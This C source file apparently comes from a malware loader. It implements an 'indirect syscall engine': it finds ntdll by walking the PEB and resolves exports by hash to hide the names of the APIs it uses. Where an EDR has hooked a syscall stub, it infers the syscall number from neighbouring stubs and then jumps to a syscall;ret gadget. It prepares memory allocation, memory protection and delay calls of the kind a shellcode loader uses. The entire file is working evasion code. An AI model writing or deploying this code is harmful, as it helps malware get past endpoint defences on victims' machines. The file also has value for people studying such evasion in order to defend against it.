// =============================================
// Syscalls.c - Indirect Syscall Engine
// =============================================

#include "Common.h"

// Global ntdll config
static NTDLL_CONFIG g_NtdllConfig = { 0 };

// -----------------------------------------------
// Initialize NTDLL config by walking the PEB
// -----------------------------------------------
BOOL InitNtdllConfigStructure(VOID) {

    // Get PEB from TEB (GS segment on x64)
    PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr)
        return FALSE;

    // Walk InMemoryOrderModuleList
    // First entry = exe, second entry = ntdll.dll
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    // Skip first entry (the exe itself)
    // Second entry is ntdll.dll
    PLDR_DT_TABLE_ENTRY pDte = NULL;
    for (int i = 0; pEntry != pHead; pEntry = pEntry->Flink, i++) {
        pDte = (PLDR_DT_TABLE_ENTRY)((PBYTE)pEntry - offsetof(LDR_DT_TABLE_ENTRY, InMemoryOrderLinks));

        if (pDte->DllBase == NULL)
            continue;

        // Check if this is ntdll.dll by examining the name
        // ntdll.dll is always the second module loaded
        if (i == 1) {
            break;
        }
    }

    if (!pDte || !pDte->DllBase)
        return FALSE;

    // Parse PE headers to get export directory
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pDte->DllBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pDte->DllBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)pDte->DllBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    if (!pExport)
        return FALSE;

    // Cache ntdll config
    g_NtdllConfig.uModule              = (ULONG_PTR)pDte->DllBase;
    g_NtdllConfig.dwNumberOfNames      = pExport->NumberOfNames;
    g_NtdllConfig.pdwArrayOfAddresses  = (PDWORD)((PBYTE)pDte->DllBase + pExport->AddressOfFunctions);
    g_NtdllConfig.pdwArrayOfNames      = (PDWORD)((PBYTE)pDte->DllBase + pExport->AddressOfNames);
    g_NtdllConfig.pwArrayOfOrdinals    = (PWORD)((PBYTE)pDte->DllBase + pExport->AddressOfNameOrdinals);

    return TRUE;
}

// -----------------------------------------------
// Resolve a single NT syscall by hash
// Extracts SSN + finds syscall;ret addr for indirect call
// Uses neighbor stub fallback for hooked stubs
// -----------------------------------------------
BOOL FetchNtSyscall(IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {

    if (!g_NtdllConfig.uModule)
        return FALSE;

    if (dwSyscallHash == 0 || !pNtSyscall)
        return FALSE;

    // Walk ntdll exports
    for (DWORD i = 0; i < g_NtdllConfig.dwNumberOfNames; i++) {

        PCHAR pcFuncName = (PCHAR)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfNames[i]);
        PVOID pFuncAddr  = (PVOID)(g_NtdllConfig.uModule + g_NtdllConfig.pdwArrayOfAddresses[g_NtdllConfig.pwArrayOfOrdinals[i]]);

        // Hash the export name and compare
        if (HashStringJenkinsOneAtATime32BitA(pcFuncName) != dwSyscallHash)
            continue;

        // Found our target function
        pNtSyscall->dwSyscallHash = dwSyscallHash;

        // --- Extract SSN ---
        // Check for clean (unhooked) syscall stub:
        // 4C 8B D1    mov r10, rcx
        // B8 XX XX 00 00  mov eax, <SSN>
        if (*((PBYTE)pFuncAddr + 0) == 0x4C &&
            *((PBYTE)pFuncAddr + 1) == 0x8B &&
            *((PBYTE)pFuncAddr + 2) == 0xD1 &&
            *((PBYTE)pFuncAddr + 3) == 0xB8 &&
            *((PBYTE)pFuncAddr + 6) == 0x00 &&
            *((PBYTE)pFuncAddr + 7) == 0x00) {

            BYTE bHigh = *((PBYTE)pFuncAddr + 5);
            BYTE bLow  = *((PBYTE)pFuncAddr + 4);
            pNtSyscall->dwSSn = (bHigh << 8) | bLow;
        }
        else {
            // Stub is hooked, search neighbor stubs to infer SSN
            // Search DOWN (next syscalls)
            for (WORD idx = 1; idx < 255; idx++) {
                PBYTE pNeighbor = (PBYTE)pFuncAddr + (idx * 0x20); // Each stub is ~32 bytes
                if (*((PBYTE)pNeighbor + 0) == 0x4C &&
                    *((PBYTE)pNeighbor + 1) == 0x8B &&
                    *((PBYTE)pNeighbor + 2) == 0xD1 &&
                    *((PBYTE)pNeighbor + 3) == 0xB8 &&
                    *((PBYTE)pNeighbor + 6) == 0x00 &&
                    *((PBYTE)pNeighbor + 7) == 0x00) {
                    BYTE bH = *((PBYTE)pNeighbor + 5);
                    BYTE bL = *((PBYTE)pNeighbor + 4);
                    pNtSyscall->dwSSn = ((bH << 8) | bL) - idx;
                    break;
                }
            }

            // If still not found, search UP
            if (pNtSyscall->dwSSn == 0) {
                for (WORD idx = 1; idx < 255; idx++) {
                    PBYTE pNeighbor = (PBYTE)pFuncAddr - (idx * 0x20);
                    if (*((PBYTE)pNeighbor + 0) == 0x4C &&
                        *((PBYTE)pNeighbor + 1) == 0x8B &&
                        *((PBYTE)pNeighbor + 2) == 0xD1 &&
                        *((PBYTE)pNeighbor + 3) == 0xB8 &&
                        *((PBYTE)pNeighbor + 6) == 0x00 &&
                        *((PBYTE)pNeighbor + 7) == 0x00) {
                        BYTE bH = *((PBYTE)pNeighbor + 5);
                        BYTE bL = *((PBYTE)pNeighbor + 4);
                        pNtSyscall->dwSSn = ((bH << 8) | bL) + idx;
                        break;
                    }
                }
            }
        }

        // --- Find syscall;ret address for indirect syscall ---
        // Scan forward from the function address to find 0F 05 C3 (syscall; ret)
        for (DWORD j = 0; j < 0x100; j++) {
            if (*((PBYTE)pFuncAddr + j + 0) == 0x0F &&
                *((PBYTE)pFuncAddr + j + 1) == 0x05 &&
                *((PBYTE)pFuncAddr + j + 2) == 0xC3) {
                pNtSyscall->pSyscallAddress = (PVOID)((PBYTE)pFuncAddr + j);
                break;
            }
        }

        // Verify we found everything
        if (pNtSyscall->dwSSn != 0 && pNtSyscall->pSyscallAddress != NULL)
            return TRUE;

        break;
    }

    return FALSE;
}

// -----------------------------------------------
// Initialize all needed syscalls
// -----------------------------------------------
BOOL InitializeNtSyscalls(OUT PNTAPI_FUNC pNtApis) {

    if (!InitNtdllConfigStructure())
        return FALSE;

    if (!FetchNtSyscall(NtAllocateVirtualMemory_JOAAT, &pNtApis->NtAllocateVirtualMemory))
        return FALSE;

    if (!FetchNtSyscall(NtProtectVirtualMemory_JOAAT, &pNtApis->NtProtectVirtualMemory))
        return FALSE;

    if (!FetchNtSyscall(NtDelayExecution_JOAAT, &pNtApis->NtDelayExecution))
        return FALSE;

    return TRUE;
}
